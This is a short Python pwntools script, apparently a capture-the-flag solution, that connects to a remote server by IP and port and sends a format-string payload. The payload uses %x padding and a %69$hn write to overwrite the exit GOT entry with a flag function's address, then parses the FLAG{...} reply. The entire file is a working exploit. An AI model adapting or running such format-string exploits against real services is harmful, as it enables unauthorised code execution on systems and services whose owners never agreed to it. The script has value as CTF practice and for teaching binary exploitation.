#!/usr/bin/env python3

import re
from pwn import *

flag_func = 0x4011b6
EXIT_PLT = 0x404038

def pad(s):
	return s + ("X"*(512-len(s)-8))

conn = remote('140.113.207.240',8835)
conn.recvuntil('goodies: ')

exploit = ""
exploit += "AAAAABBBBCCCC"
exploit += "%{}x".format(0x11b6 - len(exploit))
exploit += "%69$hn"
exploit = pad(exploit)
exploit += p64(EXIT_PLT).decode('unicode_escape')

conn.sendline(exploit)
txt = conn.recvuntil('}\n')
matchObj = re.search( rb'(FLAG{.*})', txt, re.I)
print(matchObj.group(1))

# print(conn.recvline())
conn.close()